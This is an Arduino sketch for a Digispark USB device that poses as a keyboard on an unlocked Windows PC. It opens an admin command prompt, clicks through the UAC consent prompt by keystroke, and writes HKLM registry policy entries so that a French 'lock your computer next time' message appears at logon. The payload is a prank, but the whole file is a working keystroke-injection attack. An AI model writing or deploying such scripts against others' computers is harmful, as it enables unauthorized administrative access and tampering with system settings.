#include <DigiKeyboard.h>
#define LED_ENABLE() DDRB |= 1 << PB1
#define LED_ON() PORTB |= 1 << PB1
#define LED_OFF() PORTB &= 0 << PB1
#define LED_DISABLE() DDRB &= 0 << PB1
#define HALT() while(true)
#define DEBUG

void setup()
{
    DigiKeyboard.sendKeyStroke(0);
    delay(500);

    LED_ENABLE();
    LED_ON();

    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    delay(1000);

    DigiKeyboard.print("cmd");
    delay(500);

    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT | MOD_CONTROL_LEFT);
    delay(2000);

    DigiKeyboard.sendKeyStroke(KEY_LEFT);
    delay(500);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(3000);

    DigiKeyboard.print("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v legalnoticecaption /t REG_SZ /d \"EH, TOI LA !\" /f");
    delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(500);

    LED_OFF();
    delay(100);
    LED_ON();
    delay(100);
    LED_OFF();
    delay(100);

    LED_ON();

    DigiKeyboard.print("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v legalnoticecaption /t REG_SZ /d \"La prochaine fois que tu t'en vas, verrouille-moi !!! <(°Θ°)>\" /f");
    delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(100);

    DigiKeyboard.print("exit");
    delay(100);

    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    LED_OFF();
    LED_DISABLE();
}

void loop() {}